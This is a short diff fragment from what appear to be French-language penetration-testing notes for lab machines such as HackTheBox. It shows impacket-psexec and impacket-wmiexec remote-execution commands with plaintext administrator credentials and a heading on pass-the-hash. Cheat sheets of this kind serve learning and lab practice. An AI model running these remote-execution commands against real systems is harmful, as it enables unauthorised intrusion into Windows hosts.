@@ -10,7 +10,7 @@ upload
 # suite impact
 impacket-psexec baby.vl/Administrator:password@10.129.234.71
 #Lorsque le winrm n'est pas présent dans le scan nmap
-impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100
+impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100 
 ```
 
 En mode Pass-The-Hash
